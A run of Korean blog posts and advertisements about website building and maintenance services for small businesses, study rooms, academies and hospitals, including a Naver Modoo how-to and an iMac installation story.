작업해드립니다!​   ​나의 홈페이지의 안정적인 운영을 위해홈페이지관리업체를 찾으시고 계시다면다이앤디자인에서는온라인상담을 진행중에 있으니​궁금하신 정보나 견적을빠짐없이 편하게 물어보시고해답을 찾아 가시길 바랍니다!   ​https://smartstore.naver.com/dianestyle 하늘날다 : 네이버쇼핑 스마트스토어당신의 성공에 날개를 달아드립니다. 다이앤디자인 하늘날다smartstore.naver.com      ​ 빠른홈페이지제작관리센터(Since 2005)에서 홈페이지 유지관리 고객사를 위한 또하나의 서비스!공유오피스 서비스를 시작합니다.​ 빠른홈페이지제작관리센터 공유오피스 공용회의실빠른홈페이지제작관리센터 1644-9365홈페이지 탄생에서 양도, 양수까지.상호추천, 도메인 추천, 브랜드포지셔닝홈페이지기획,홈페이지제작 및 유지관리웹프로그래밍을 통한 이용자 활성화지원 및 ASP 서비스간의 연계지원,온라인 광고 대행도메인 양도양수,웹호스팅 이전 서비스까지​빠른홈페이지제작관리센터가 하는 일은 다양합니다.​금번  빠른홈페이지제작관리센터에서는 창업하시는 분들을 위해 홈페이지 제작 및 관리 공유오피스 서비스를 한데 묶은 '비즈니스서포트 관리'상품을 새롭게 출시했습니다.  창업 특별 지원 공유오피스 제공- 비즈니스 서포트 창업 ! 어디서부터 준비해야 대야 할지 막막하신가요?컴맹은 아니지만, 그렇다고 하고싶은 일을 모두 다 할 수 없다면!창업부터 홈페이지제작,유지관리,문서작성,컴퓨터 업무지원까지 One-Stop Service!  아울러, 그동안 창업하시는 분들을 위한 맞춤 서비스까지 제공하고 있습니다.창업을 하면서 겪는 어려움과 궁금증..지금까지는 마땅히  물어볼 곳이 없었지만, 이제 빠른홈페이지제작관리센터를 통해서 창업 초기 사무실 준비에서부터 로고, 홈페이지 제작,관리까지 원스탑서비스가 가능하게 되었습니다.​ 토탈인터넷비즈니스센터 빠른홈페이지제작관리센터이용이 궁금하신 분들은 전국 어디서나 국번없이 1644-9365로 문의하시면 친절한 안내를 받으실 수 있겠습니다.​http://speed365.co.kr/default/#step03 빠른홈페이지제작관리센터빠른홈페이지제작관리센터,이지홈페이지센터를 운영하고 있는 빠른홈페이지제작관리센터 공식 홈페이지입니다.speed365.co.kr ​ 이제는 사업의 분야에 상관없이 온라인 광고와 관리가 필수가 되었습니다.그 중심에는 사업장의 홈페이지가 있는데요. 사실 사업주님이 컴퓨터 전문 분야 특히 홈페이지 관리에 전문가가 아니라면 너무 힘든게 사실입니다.​그렇게 때문에 대부분의 사장님께서 홈페이지 만들기를 형식이 정해져 있는 탬플릿 형태로 하시거나, 유로로 만들고 계십니다.​하지만 홈페이지는 제작에서 끝나는 것이 아니라 관리가 더 중요합니다.​전문 디자이너들이 직접 디자인 하고 관리하는 [바른웹]을 소개하려고 합니다. 바른웹은 임대하는 홈페이지가 아닌 본인 소유의 홈페이지를 가질 수 있습니다.​PC홈페이지 제작은 타사 맞춤형 제작시 13페이지 기준으로 130만원인데 바른웹에서는 무료로 진행되고 있습니다.​모바일 홈페이지 제작은 타사 맞춤형 제작시 4페이지 기준으로 80만원인데 바른웹에서는 무료로 진행되고 있습니다.​반응형 홈페이지 제작은 타사 맞춤형 제작시 8페이지 기준으로 300만원인데 바른웹에서는 무료로 진행되고 있습니다.​무료 제작 & 월 3만원의 관리비로 전문가 홈페이지 소유 가능합니다!! 아래 사이트에서 15초 영상이 끝나면 홈페이지 제작 무료 상담 요청을 하실 수 있습니다. 바른웹 - 비디오 서비스 플랫폼 자몽pick바른웹 무료로 고퀄리티의 홈페이지를 제작해주는 바른웹 에이전시 서비스를 추천합니다. - jamongpickjamongpick.com ​​ 5년 후에는 비용이 발생하지 않기 때문에 오래 사업을 하시는 분께는 비용절감의 기회가 됩니다.​​ 바른웹은 7년간 10,000여개 이상의 홈페이지를 제작해 온 회사입니다.풍부한 경험으로 다양한 제작 프로그램이 개발되어 있어서 제작 비용을 무료로 제공할 수 있게 되었습니다. -​※ 월 3만원의 관리비 만으로도 이 모든 혜택이 가능합니다.- 최대 32페이지 무료제작- 모바일 무료제작- 원하는 도메인 무료등록- 2차 백업 무료제공- 방화벽 무료세팅​ ​코로나 시대, 온택트 시대에 홈페이지의 중요성은 두말할 필요가 없죠. 무료로 제작해 준다는 곳에서 간단한 홈페이지를 만들고 직접 관리하시는 것은 오히려 효율성이 떨어질 수 있습니다.​남들과 똑같은 홈페이지가 아니라 사업 분야과 특성에 맞는 홈페이지를 전문가와 함께 상담하셔서 사장님의 사업 브랜드가 더욱 빛날수 있길 바랍니다.​​#무료홈페이지제작#홈페이지제작업체#웹사이트제작#홈페이지제작비용#모바일사이트제작#플레이업빙고#PLAYUPBINGO​해당 게시물은 업체로부터 일정 수수료를 받고 작성된 글입니다.​​​​ 안녕하세요!​오늘은 해야 하지만, 하기는 귀찮은 홈페이지 관리에 대한좋은 Tip을 안내드리려 합니다.💗​​회사 다니면 정말.. 일이 많잖아요.정말 어쩜 그리 일이 많은지 돌아서면 전화 오고, 여기저기서 메신저로 갑톡튀 물어보고💫​근데 사실 홈페이지 수정이나, 팝업 띄우기 가끔 해야 하긴 하는데너무너무 귀찮고오랜만에 하면 어디를 어떻게 해야 할지 항상 헷갈리잖아요​  그래서! 홈페이지 관리 비서를 소개 드립니다.   ​​단돈 월 5만 원!으로오탈자, 단순 링크 수정, 이미지 수정, 팝업/ 배너/ 서브 페이지 제작까지모~두 알아서 해주는​ ❗ 가비아 홈페이지 유지보수 서비스 ❗ 가비아 홈페이지 관리​​홈페이지 관리가 처음이실 경우얼마큼의 서비스가 필요한지 가늠하기 어려우니까​처음엔 베이직 서비스를 이용하시고(월 5만 원) 혹시 홈페이지 수정이 많이 필요하다 싶을 땐 요금제를 변경하는 걸 추천드려요!​​​ 가비아 유지보수 가격표​ 자세한 내용은 가비아 유지보수 페이지에서 확인 가능합니다http://maintain.gabia.com/service?utm_source=naver&utm_medium=cns_blog_post&utm_campaign=brand 가비아: 대한민국 No.1 홈페이지 유지보수홈페이지 운영의 모든 것을 전문가의 세심한 케어에 맡기세요maintain.gabia.com ​상담 시 블로그에서 소개받고 왔다고 하면특별 혜택이 있다고 하니, 꼭 말씀 주시고요!​​​여러분의 홈페이지 관리 고민!전문 IT 기업 가비아에서 해결하세요.  ​​​​#가비아씨엔에스 #가비아퍼스트몰 #퍼스트몰 #쇼핑몰창업 #쇼핑몰제작#이셀러스 #주머니 #쇼핑몰통합관리 #오픈마켓통합관리 #마켓통합관리 #홈페이지제작 #홈페이지유지보수 #홈페이지구축 #가비아홈페이지 #홈페이지관리#홈페이지수정 #홈페이지배너 #홈페이지팝업 #홈페이지수정 #홈페이지관리비서#가비아홈페이지 #가비아유지보수 #가비아간편제작 #가비아 수정/골드/실버 객실이 풀빌라펜션으로 변모하였습니다.수영, 물놀이를 바로 앞에서 즐길 수 있는 펜션​* PC버전, 모바일버전 홈페이지 적용- 객실소개 변경- 객실내 풀빌라 수영장 사진 추가- 메인 사진 업데이트- 공지 및 갤러리 등록- 블로그 포스팅 홍보지원​감사합니다.​http://www.vdesign.kr 전주 홈페이지제작 브이디자인전북 전주 홈페이지제작 업체/관리, 쇼핑몰 제작/관리, 웹솔루션, 웹프로그램, 개발, 웹디자인, 홈피제작, 견적, 제작비용www.vdesign.kr #전주홈페이지유지보수#전주홈페이지수정#전주홈페이지관리​ #홈페이지제작 #홈페이지관리#홈페이지홍보 #와짱서비스#온라인마케팅 #사업자지원#소기업지원 #소상공인지원#자영업자지원 #가성비#매출고민홍보고민싹다해결​🌈    🌈   🌈​◇ 사업자 ( 소기업, 소상공인, 자영업자 )여러분들의 고민을 해결합니다. ​◇ 코로나19의 어려운 상황에서수고하시는 사업자 사장님들의 고민.?온라인마케팅을 와짱 서포터즈가확실히 지원합니다. ​◇ 홈페이지,블로그,포스팅,동영상 등제작관리홍보를 1번에 원스톱 처리하는가성비 사업자 솔루션을 제공합니다. ​◇ 홍보고민 / 매출고민와짱이 싹~ 다 해결합니다. ​☎️  가입 신청 문의 : 1577-7942    ¤ 홈페이지 제작,관리,홍보 관련 ¤와짱 동영상 ~      ✅  와짱 오시는 길 ~ 와짱서울특별시 양천구 중앙로 262 메디바이오플렉스 5층  ​​​​온라인으로 영업을 하고 내 회사를 알리기 위해서는 홈페이지가 반드시 필요합니다 동종업체의 경우에 납품업체나 협력업체를 찾을때도 홈페이지를 통해서 정보를 얻는 경우도 많은데요 그래서 기업홈페이지 기능이 얼마나 중요한지 알게 될 것입니다 기업홈페이지제작업체 알드릴텐데요 회사에서 가장 중요한건 비용절감일텐데요 이건 뭐 기본으로 깔 고 들어가면서 효과적인 홈페이지 제작방법까지 알아보는 시간가져보겠습니다 ​​​ ​​​​대체적으로 기업홈페이지제작업체 의 의뢰내용은 회사소개  및 사업소개를 위해서 제작되고 있으며 업종에 따라 갤러리나 커뮤니터 카테고리 등의 약간의 차이가 있습니다 ​​저렴한 비용으로 기업홈페이지 제작하기위해서 무료를 찾는경우도 많은데요 결국은 다시 업체를 통한 제작으로 돌아오시더라구요 그게... 무료로 제공되는 온라인상의 홈페이지제작은 일정 기간이 있으며 이는.. 계약의 대한 번그러움 과 혹여나 있을 수정의 대한 작업일 안될 가능성이 있습니다 ​​​​​ ​​​​사업.. 하루 이틀 하고 끝날거 아니기 때문에 월 이용료정도 관리비 정도 ?부담하고 제작의 대한 부담없이 홈페이지 제작 시작하는게 더 가성비가 높아요 여기서 이용료는 한달 3.만원인데요 재정적으로 이정도 회사에서 부담되는거 아니죠!!​​​ ​​​​업체마다 업종마다 홈페이지 배열구성이나 색상적용은 차이가 날 수 있겠죠 기업홈페이지제작업체 를 찾을때 꼭!!! 콕 체크사항있습니다 ​ 제작의 대한 비용 부문(타업체 비교시 84% 절감) 수정가능 부문(피드백)회사홈페이지 소유권 적용기타.. 추가적인 서비스/보수​​업체에 문의하면 알겠지만 가격이 아~주 너무 하늘땅이라서 이게 비싼게 맞는건지 싼게 맞는건지 헷갈립니다 가장 좋은 조건은 퀄리티는 높고 가격은 싼곳 ..고객 니즈에 최대한 맞출 수 있는 곳이 아닐까요..​​​ ​​​홈페이지는 텍스트와 이미지로 이뤄지지만 이게 일률적으로 진행되는 곳이많습니다 또.. 오랫동안 운영해도 소유권이 회사로 넘어오지 않고 결국 임대형이라 평생 계약 묶여야 한다면 얼마나 번거로울가요 ​​​ ​​​​안정적으로 자체 홈페이지(독립형) 으로 시작부터 진행하시되.. 마지막으로 기업홈페이지제작업체 내세우는 추가조건도 확인해주셔야 합니다 홈페이지 보수 작업이나 바이.러스 의 대한 대처 등..홈페이지 관리에 필요한 추가사항 제공 여부 항목여부 꼭 체크해주시길 바랍니다 ​​​​  기업홈페이지제작 3만원으로 시작하기~~~~>> ​​올해도 반이상이 지나갔네요 기존에 홈페이지가 있지만 회사의 이미지와 맞지않거나 제기능을 제대로 하지 않느다면 이번 기회에 재정비를 할 필요가 있습니다 ​​홈페이지 제작 등의 내용은 별도로 한번더 꼭..확인해보시길 바랍니다 ​​날씨가더워요.. 건.강 조심하세요~~~​​​​​  ​​​​ ​ #홈페이지블로그제작관리홍보#홈페이지제작업체#와짱주식회사 #벤처기업#이노비즈기업 #국가유공자표창수상#가성비온라인마케팅#사업자솔루션​🌷   🌈   🌷​와짱 주식회사 ​2000년에 설립되어사업자 ( 소상공인 • 자영업자 )성공을 위해, 21년 동안오롯이 외길, 인생 기업 ~ ☘​벤처기업, 이노비즈기업으로국가 산업 발전에 기여 ~🎖( 지식경제부 장관상 표창 )( 국가 유공자 기업 표창 )    사업자 소상공인 여러분의든든한 동반자가 되어웃음을 주는 힘이 되겠습니다 .​홍보 고민 / 매출 고민싹 ~ 다 해결합니다.^^  홈페이지 제작 & 블로그 제작은 가성비 사업자 솔루션  와짱에서 ~  ✅  홈페이지 제작 동영상    홈페이지 관리 & 블로그 관리는저비용 고효율, 사업자 솔루션와짱에서 ~   ✅  홈페이지 관리 동영상   홈페이지 홍보 & 블로그 홍보​Naver  •  Daum​등록 및 홍보는 와짱에서~  ✅  홈페이지 홍보 동영상  ​   먹고 튀는 사기 업체꼭 ,,, ( 주의 ) 하세요   ☎️  가입 상담 문의 : 1577-7942 ​ ​검색 한 번에 ‘우리 공부방’ 뜨게 하는 방법! ​대면 홍보의 한계가 명백해진 코로나 시대. 이제 많은 기업과 사업체들이 ‘온라인 홍보’의 중요성을 실감하고 있습니다. 더 많은 잠재고객과 만나기 위해 멋진 홈페이지를 만들고 포털 사이트 검색에 노출되기 위해 광고비를 쏟아붓죠. ​공부방을 운영하시는 원장님들께서도 홈페이지를 만들어 지금 당장 공부방홍보를 시작할 수 있는데요. 이런 일들이 대기업이나 대형 학원만 할 수 있는 일 아니냐고요? 아닙니다!​무료로 쉽게 홈페이지를 만들고, 네이버 검색 한 번에 우리 공부방이 ‘짜잔’ 등장하게 하는 방법. ​네이버 ‘모두(Modoo)’를 활용하면 할 수 있습니다.​모두(Modoo)로 공부방홍보를 위한 홈페이지 만드는 방법!지금부터 보시겠습니다 : )   모두(Modoo) 홈페이지 시작하기​모두(Modoo)는 네이버에서 제공하는 무료 홈페이지 제작 서비스입니다. 클릭 몇 번만 하면 우리 공부방을 홍보하는 홈페이지를 언제 어디서나 쉽게 만들어 운영이 가능합니다. 컴퓨터를 잘하지 못해도, 디자인에 대해서 잘 몰라도 안내에 따라 정보만 입력하면 누구나 만들 수 있습니다. ​공부방에 대해서 알리고 싶은 정보를 깔끔하게 정리하고 관리중인 SNS 계정들을 모아 한 번에 소개하면서 스마트 플레이스 검색을 통해 노출시켜 더 많은 잠재 회원들에게 알릴 수 있습니다.​모두(Modoo)에서 제공하는 기본 가이드만 보고 따라해도 쉽게 만드실 수 있으니, 아래 링크로 접속하셔서 바로 시작해보세요!​​👇 모두(Modoo) 홈페이지 만들기 👇 누구나 쉽게 무료로 만드는 홈페이지누구나 쉽게 무료로 만들수 있는 모바일 홈페이지www.modoo.at  모두(Modoo)템플릿 활용하기모두(Modoo)에는 많은 사람들이 쓰고 있는 홈페이지 템플릿이 있습니다. ​‘업종별 템플릿’ 화면에서 ‘학원’ 템플릿을 찾아 ‘나도 만들기’를 눌러보세요. 이미 만들어진 홈페이지 제작 사례를 참고하면 더 쉽게 만드실 수 있습니다. ​ ​또한, 공부방홍보에 딱 맞는 구성을 추천받기 위해서는 아래 정보들을 추가로 입력하시면 좋습니다. ​ ​① 홈페이지 제작을 위해 내가 준비한 이미지 개수이미지가 5개 이하이면 버튼형 홈페이지를, 더 많다면 이미지형이나 포스트형 홈페이지를 만들 수 있습니다.​② 홈페이지에 표시될 우리 공부방의 주소공부방 주소를 입력해 고객이 찾아오기 쉽도록 안내할 수 있어요​③ 홈페이지에서 한데 모아볼 수 있는 블로그/페이스북/인스타그램 계정현재 운영중인 SNS 계정이 있으시다면, 연계해서 홍보 효과를 높일 수 있습니다. ​④ 홈페이지를 통해 바로 예약이나 구매가 가능하게 할 것인지 여부쿠폰이나 이벤트 등 공부방에서 진행중인 프로모션 홍보 페이지도 만들 수 있어요!   모두(Modoo) 홈페이지상세페이지 구성하기‘학원’ 홈페이지 템플릿을 선택하면, 학원 홍보에 적합한 상세페이지가 구성됩니다. 각각의 페이지에 맞는 정보를 입력해 홈페이지를 완성하세요.​일반적인 공부방 홈페이지는 < 홈 / 교육 과정 / 내부 시설 / SNS / 쿠폰 >으로 구성할 수 있으며, 상세페이지마다 적절한 정보를 넣어주시면 됩니다!​ ​첫 페이지에는 우리 공부방을 알릴 수 있는 이미지와 간단한 소개 그리고 공부방 원장님의 경력 등 회원들에게 신뢰감을 줄 수 있는 정보들로 정리하면 좋습니다. 그리고 교육 과정 페이지에서는 ‘한솔플라톤’의 알찬 교육 프로그램을 자랑하는 내용으로 정리해주세요!​또한 SNS 페이지에서는 우리 공부방을 알리는 블로그, 페이스북, 인스타그램 주소를 소개하세요.아이들의 공부하는 모습, 공부방의 분위기, 특징 등을 SNS를 통해 자연스럽게 보여준다면 회원 유입에 도움이 됩니다. 이벤트가 있다면 쿠폰 페이지를 통해 알려주세요.​이 밖에도 필요한 페이지를 추가로 만들 수 있는데, 학부모 상담을 위한 문의 게시판을 개설해 두는 것도 좋습니다 : ) ​ ​모든 정보를 다 입력했다면, ‘컬러 선택’을 통해 디자인을 꾸며보세요.그리고 모바일/ 웹 미리보기를 통해 공개될 홈페이지를 검토한 다음, ‘공개하기’를 누르면 우리 공부방 홈페이지가 짜잔! 하고 등장합니다.​  모두(Modoo) 홈페이지홍보 활동하기​모두(Modoo)로 만든 공부방 홈페이지로 어떤 홍보 활동을 할 수 있을까요? ​네이버의 다양한 검색, 서비스 기능과 연계해 공부방을 더 많은 사람들에게 더 잘 알릴 수 있는 대표적인 활용법 세 가지를 참고하세요.​1) 네이버 검색과 지도​ 노출홈페이지 관리 페이지에서 ‘네이버 검색 노출’ 기능을 체크하세요.지도 노출을 통해 ‘스마트 플레이스’와도 연계 되어 더 큰 홍보 효과를 낼 수 있습니다. ​2) 무료 예약 서비스 ‘네이버 예약’​ 시스템 활용네이버 예약 페이지에서 새 예약을 만들고 내 ​홈페이지와 연동​하여 관리가 가능합니다. ​3) ‘네이버 톡톡’ 서비스고객과 실시간 대화를 할 수 있는 톡톡 서비스로 쉽고 빠른 고객 상담이 가능합니다.또한 ‘톡톡 친구’ 기능을 활용하면 무료 단체 메시지를 보낼 수도 있어요!​  ​전문가의 도움 없이 쉽게 만드는 홈페이지 모두(Modoo) 활용법을 알아봤습니다.멋진 홈페이지를 갖추고 나면 학부모님들에게 공부방에 대한 정보 제공을 통해 전문성과 신뢰감을 심어줄 수 있습니다. ​한솔플라톤에서는 원장님들을 위한 공부방홍보 지원을 적극적으로 해드리고 있습니다.최근 원장님들의 온라인 홍보 관련 교육 니즈가 높아짐에 따라 7월 한 달 동안 ‘네이버 스마트 플레이스’ 광고 뿐만 아니라, 온라인 홍보 역량 강화를 위한 <온라인 홍보 전문가 과정>을 통해 다양한 강의들을 지원하고 있습니다.​공부방 원장님들을 위한 한솔플라톤에만 있는 특별한 홍보 지원! 아래 링크를 통해 자세히 확인하세요.​​한솔플라톤에만 있는 <온라인홍보 전문가 과정> 😃 [이벤트] 플라톤에만 있는 공부방 원장님을 위한 특별한 홍보지원! <온라인홍보 전문가과정>[BY 한솔플라톤] 한솔플라톤아카데미에서는 공부방 원장님들의 지원을 위해 온라인에서 공부방을 홍보 ...naver.me  ​👇 한솔플라톤아카데미 개설 문의 👇 ​​👇 한솔플라톤러닝센터 개설 문의 👇  뷰티샵 매장에서 홈페이지 관리용으로 사용할 애플컴퓨터 설치되었습니다.작은 공간에서 일반적인 본체형 컴퓨터를 설치하면 주렁주렁한 선들과 본체 모니터가 정신없을수 있기때문에 깔끔한 일체형 PC 를 선호하는 분들이 많아졌습니다.인테리어 귀엽고 이쁘게 해놓았는데 컴퓨터가 전체적인 느낌을 방해하면 안되기때문에 눈에 확 들어오는 멋진 pc를 설치 하게 되었습니다. 디자이너 생활을 오래 하시다가 오픈하신샵인데 작업을 안하신지 오래 되어서 걱정된다고 하셨어요.홈페이지 관리및 사무용으로 사용하고, 남는시간에는 동영상 감상및 웹서핑용도로 사용하신다고 합니다. 보통 매장에서 구입하시는분들은 카운터 위에 설치하는경우가 많은데, 적정한 사이즈의 테이블이 있어서 거기에 설치했습니다. 빛이 많이 들어오는 환한 분위기에 깔끔한 인테리어가 카페같은 느낌을 들게해서 iMac을 설치했을때 더욱 돋보였습니다. 여성스러운 분위기의 인테리어 분위기와 소품에 애플 일체형PC iMac이 포인트가 되었습니다. 보통 이런 공간에서 노트북을 사용하면 더 좋다고 생각하는 분들도 있는데, 맞습니다.노트북은 접어서 다른곳에 보관해놓았다가 필요할때만 꺼내놓고 사용할수 있기때문에 공간적인면에서 유리한건 맞지만 업무용으로 본격적인 작업을 하는데에는 무리가 있습니다. 요즘은 규모가 작은 샵에서도 마케팅과 홈페이지 관리를 해야하기때문에 동영상 편집및, 블로그 작업등, 많은 작업을 하려면 작은 모니터와 느린 성능의 컴퓨터로 매일 작업하기에는 스트레스가 뒤따릅니다.​그래서 강력한 성능과 초고화질의 모니터가 탑재되어있고, 디자인도 이쁜 최적의 일체형pc 가 애플컴퓨터 iMac입니다.​윈도우와 맥환경이 동시에 실행되기때문에 일반인들이 우리나라 환경에서 모든 작업을 다할수 있는 최적의 컴퓨터 입니다. 디자이너 하실때 가지고 계시던 인튜어스 와콤 타블렛을 꺼내오셨어요.직접 설치하신다고 하셨는데, 의외로 드라이버를 잘못 설치하면 맥에서 오류를 일으키는 경우가 많기때문에 제가 직접 설치해드렸어요. 저도 와콤 홈페이지에서 최신 드라이버 받아서 설치했는데 오류나서 제가 가지고 있던 이전버전 드라이버를 설치했더니 정상동작하여, 사용자분이 헉,.. 내가 설치했으면 전화할뻔 했네요.. 하고 놀라셨네요. 맥을 사용하다보면 갑자기 이유를 알수 없는 오류가 생길수도 있고, 내가 하고자 하는작업에 어떻게 설정을 해야 편하게 되는지 궁금할때 저희에게 도움을 요청하면 언제든 도움을 드리고 있어요.그렇기때문에 안심하고 편하게 맥을 사용할수 있습니다.   복잡하게 엉켜있는 배선을 싫어하고 깔끔하게 전원선 하나로 모든게 끝나는 애플컴퓨터는 사용해보신분들이 만족해하시며 영원히 이컴퓨터만 사용하게 되는 마법이 있습니다.​좋은 장비가 매장에 들어오면 이전과 다른 생활을 할것이라 생각합니다.영화도보고, 블로그도 쓰고, 음악도 듣고 이장비 하나가 하루에 사용자와 함께하는 비중을 생각해본다면 최고의 만족감을 선사 할것입니다. 언제어디서나 쉽게 학원 홈페이지 관리 - 통통통 Pro  안녕하세요 통통통입니다.​성공적인 학원홍보를 위해 학원 홈페이지 운영을 생각 중이신가요?지금까지 홈페이지 관리 따로, 학원 경영관리 따로 두 번 일을 하고 계셨다면오늘 포스팅에 주목해주세요.​전문학원관리 통통통 Pro는홈페이지 제작에서부터 전문 경영분석까지원스탑 솔루션을 제공하고 있습니다.    학원 홈페이지는 잠재 고객에게 학원에 대한 첫인상을 남기는 관문이므로심혈을 기울여 제작할 필요가 있습니다.​전문학원관리프로그램 통통통 Pro에서는 웹/모바일 홈페이지 지원은 물론,홈페이지 관리 툴 및 원생 마이페이지로 손쉽게 운영할 수 있습니다.​▲ 홈페이지 시안이 궁금하신 분들은 위 이미지를 클릭해주세요 ▲     원스탑 학원관리프로그램 통통통 Pro는통통통 Lite에서 한 단계 더 업그레이드되어학원 홈페이지 제작 뿐만 아니라,맞춤식 학원 경영분석 서비스를 제공하고 있습니다.​일일 반별 상세현황과 퇴원, 신규 원생 현황, 미납/환불 현황, 그리고 실적 현황 등의 데이터를 분석하여 언제 어디서는 한번에 학원 현황을 확인할 수 있습니다.​체계적인 경영분석을 통해 학원 경쟁력을 강화해보세요.    학원 홈페이지도 모바일 시대입니다.​통통통 Pro에서는 모바일 서비스를 강화 하여학생/학부모와의 커뮤니티 기능은 기본!​학원 모바일 홈페이지를 제공하여 학원 홍보마케팅까지원스탑으로 실현시켜 드립니다.​ 모바일 APP으로 기존 학부모/학생 관리를,모바일 학원 홈페이지로는 잠재 고객들에게 홍보를!!한 가지 서비스로 일석多조의 효과를 볼 수 있습니다.    통통통 Pro 서비스는 사용 기능에 따라 총 세 가지로 나뉘어집니다.​ 고급형 학원 홈페이지, 전문 학원경영분석 및 관리, 온라인 시험 성적평가 시스템, 교육과정 개설 및 관리 기능 등 원하는 기능을 골라자신의 학원과 맞는 서비스를 이용할 수 있으니 더욱 효과적이겠죠?​    성공학원으로 가는 지름길 통통통과 함께보다 간편하고 체계적인 학원 관리를 시작해 보세요.     ​ ﻿비용 절감한다고 병원홈페이지의 웹호스팅 비용만 최소로 지불하면서 유지하는 병원부터 이런 저런 서브페이지를 수정보완하는 병원에 이르기까지 다양한 병원들의 홈페이지 유지보수 행태를 관찰할 수 있었는데요. 다수는 홈페이지 유지보수라 하면 이벤트나 진료 휴무 안내, 새로운 의료진 영입 등의 공지에 대한 팝업을 간단히 올리는 조건으로 저렴하게 계약하는 경우들입니다. 또한 PC 홈페이지보다 병원 모바일홈페이지는 상대적으로 관심을 덜 기울이는 경우도 많죠.​그런데 병원이 (PC든 모바일이든) 홈페이지를 만드는 목적을 생각하면 이런 최소 유지에 목적을 둔 홈페이지 관리는 문제가 될 수 있습니다. 병원의 브랜드 체험 전 대외적인 병원마케팅의 최종 게이트라 할 수 있는 홈페이지는 마케팅 경쟁상황에서 경쟁병원들과의 차별화와 경쟁력 우위의 질을 확보해야 하죠. 이에 대해서는 대체로 병원 원장들이나 담당자가 인지를 하고 있어서 홈페이지 개발에 기꺼이 투자를 하려고 하는데요.​​홈페이지 개발이 완료되고 유지보수 단계에 들어가서는 이러한 홈페이지 기능과 목적을 잊어버리는가 봅니다. 병원홈페이지가 광고처럼 수개월 내 쉽게 교체할 수 있는 것도 아니기 때문에 일년 이상 유지보수를 통해 병원 홈페이지의 질과 경쟁력 관리를 적극적으로 해나가는 것은 당연합니다.​그러한 관점에서 병원 홈페이지의 유지보수는 홈페이지 개발 후부터 변화되는 병원마케팅 상황, 병원브랜드 포지셔닝 상황 등을 반영하는 것이 필요합니다. 가령, 홈페이지 개발 후 병원 진료상품의 변동이 있다거나 ​진료시스템이 업그레이드 되었다거나 경쟁군들의 공격적인 마케팅 활동으로 인해 소비자 유입률의 방어상황이 왔다거나 하는 등의 마케팅 상황의 변화, 우리병원을 (이러한) 차별적 가치로 인식시키기 위한 포지셔닝 방향에서의 보완 등을 반영해 메뉴, 메인페이지의 메인뷰, 상세페이지(서브페이지) 등을 수정 보완할 수 있어야 합니다.​​​병원마케팅이나 병원브랜딩의 상황 반영 외에도 병원홈페이지의 로그분석을 통해 전환이 잘 이루어지지 못하는 서브페이지들의 조정, 상담률의 상황을 봐서 상담 툴의 보완 등 병원홈페이지 자체의 경쟁력도 유지보수 단계에서 지속적으로 관찰하고 관리해야 합니다. ​​​물론 이러한 적극적인 홈페이지 관리는 기존 유지보수와 다르게 비용에 대한 투자도 생각해야 하고 무엇보다 그러한 질을 담보할 수 있는, 홈페이지의 전략적 운영과 컨텐츠 생산이 가능한 홈페이지 개발업체의 컨택도 ​고려되어야 합니다. 그럼에도 불구하고 병원홈페이지의 브랜딩 관점에서의 관리는 병원마케팅의 효율성과 나아가 병원브랜드의 성장 면에서 매우 중요합니다. ​단, 이러한 유지보수는 리뉴얼을 할 정도로 병원브랜딩과 무관하게 만들어진 홈페이지에 대해서는 아닙니다. 부분 보수와 보완으로 가능한 수준의 홈페이지가 아니면 신속히 경쟁력을 제대로 제고하는 홈페이지 리뉴얼이 필요하죠.​​​네이버 블로그는 맞지만, 확인불가﻿학원올에서는 네이버 모두를 이용하여 학원홈페이지를 제작해드리곤 합니다. 학원홈페이지가 완성된 후에는 학원에서 직접 관리도 하고 홈페이지 유입도 한 번씩 체크를 해보시는것이 중요합니다. 점점 학원홈페이지에서는 게시판 활용을 줄이면서 학원에 대한 이미지를 넣지만, 최소한의 학원 공지사항은 관리해주시는 게 좋습니다. ​​네이버 모두를 이용하여 모바일 학원홈페이지를 제작 완료 후에는, 원장님의 활용도가 중요합니다.  우리 학원 홈페이지를 어떤 키워드를 조회하여 방문하는 지? 온라인 상담 신청은 있는 지? 그리고 몇 명이나 우리 학원홈페이지를 방문하는 지? 이번 달에 특별히 학원에서 공지할 내용이 있는 지? 등등 확인하고 공지를 하면 좋겠습니다. ​​​네이버 모두를 검색하여 사이트로 들어가면 오른쪽 상단에 [사이트관리]가 있습니다. [사이트관리]로 들어가면 학원에서 만든 홈페이지가 보입니다. 학원올같은 경우에는 여러 개가 보이겠지만 학원에서는 사이트가 한개 보일겁니다.​​​[사이트이름]을 클릭하면 현재 운영중인 사이트 내용들이 보입니다. 사이트편집하기, 통계, 게시판 관리등의 메뉴를 볼 수 있습니다. 이 화면에서 사이트 관리가 이루어진다고 보면 되겠습니다.​​​[통계]를 클릭하면 방문현황 요약 정보를 볼 수 있으며, 옆의 메뉴들을 활용하여 상세한 내용들을 기간별로 확인이 가능합니다. ​​​위에서 사이트 이름을 클릭하여 보이는 화면에서 [게시판/문의관리] 에서 학원 홈페이지에서 신청한 온라인상담신청 및 공지사항 혹은 게시판에 글쓰기가 가능합니다. 실제로 학원에서는 온라인상담신청은 자주 들어오는 편은 아닙니다만 한번씩 확인하는 게 좋습니다.​​​사이트편집하기는 직접 수정이 가능하면 사이트 편집하기를 활용하여 하시면 됩니다.학원홈페이지를 학원올에서 한 경우에는 학원올로 연락주시면 되겠습니다. ​네이버모두를 통하여 학원홈페이지가 충분히 제작가능합니다. 제작이 중요한 게 아니라 어떻게 학원홈페이지를 활용하느냐? 가 훨씬 더 중요하겠습니다. 위에서 알려드린 메뉴얼을 활용하여 우리 학원홈페이지에 어떤 검색어들로 방문객들이 유입이 되는지도 확인도 하고 학원에서 공지할 내용이 있으면 공지사항에 공지글도 남겨주시면 좋겠습니다.​네이버모두 관리법에 대하여 정리해드렸습니다.어떤 유입검색어으로 우리 학원 홈페이지를 방문하는 지?를 알면 학원홍보를 위해 전략을 세우는 데 도움이 될 것입니다. ​​​﻿병원홈페이지를 제작하는 경우는 개원처럼 기존 홈페이지가 없어서 만들어야 하는 경우도 있고 기존 병원홈페이지가 오래되었거나 비전략적으로 개발되어 현재 운영하고 있는 진료군과 병원브랜딩에 적합하지 못하기 때문에 리뉴얼이 불가피해진 경우가 전형적인데요.​​그런데 비용을 들여 홈페이지를 개발했지만 이후 관리에 대해서는 소극적으로 그리고 관행적으로 이루어지고 있는 것이 개원가의 현실입니다. 상담게시판에 올려진 고객 글의 답변을 달고, 후기나 사례사진을 업로드하고, 팝업을 간헐적으로 다는 정도가 대체로 병원홈페이지 관리업무인데요.그러나 [다시 알아야할 병원마케팅] 책을 통해서도 이후 